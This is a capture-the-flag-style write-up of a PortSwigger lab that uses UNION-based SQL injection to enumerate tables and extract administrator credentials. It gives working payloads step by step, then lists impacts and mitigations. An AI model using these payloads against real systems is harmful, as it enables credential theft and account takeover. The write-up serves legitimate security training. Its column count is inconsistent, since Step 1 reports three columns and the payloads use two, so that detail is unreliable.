# SQL Injection - Retrieving Data from Other Tables

## Lab Information

| Field | Value |
|--------|--------|
| Platform | PortSwigger Web Security Academy |
| Module | SQL Injection |
| Lab | Retrieving Data from Other Tables |
| Difficulty | Apprentice |
| Status | ✅ Solved |

---

## Objective

Exploit a UNION-based SQL Injection vulnerability to retrieve credentials stored in another database table and log in as the administrator.

---

## Vulnerability

SQL Injection

HTTP Method

```
GET
```

Parameter

```
category
```

---

## Lab Goal

Retrieve

- Administrator Username
- Administrator Password

from the

```
users
```

table.

---

## Enumeration Process

### Step 1

Determine the number of columns.

```
ORDER BY
```

Result

```
3 Columns
```

---

### Step 2

Find the text-compatible columns.

Payload

```sql
' UNION SELECT NULL,NULL--
```

Result

```
Two text-compatible columns identified.
```

---

### Step 3

Identify available tables.

Payload

```sql
' UNION SELECT table_name,NULL
FROM information_schema.tables--
```

Result

```
users
```

---

### Step 4

Identify columns.

Payload

```sql
' UNION SELECT column_name,NULL
FROM information_schema.columns
WHERE table_name='users'--
```

Result

```
username
password
```

---

### Step 5

Retrieve credentials.

Payload

```sql
' UNION SELECT username,password
FROM users--
```

Result

```
administrator
<password>
```

---

### Step 6

Login

Use the administrator credentials to log in.

---

## Result

Administrator account accessed successfully.

Lab solved.

---

## Impact

If attackers can retrieve sensitive data from backend tables, they may gain access to:

- User Credentials
- Password Hashes
- Personally Identifiable Information
- Financial Data
- Administrative Accounts

---

## Mitigation

- Parameterized Queries
- Prepared Statements
- Stored Procedures
- Input Validation
- Least Privilege Database Accounts
- ORM

---

## Tools Used

- Burp Suite Professional
- Firefox
- PortSwigger Web Security Academy

---

## Status

✅ Lab Solved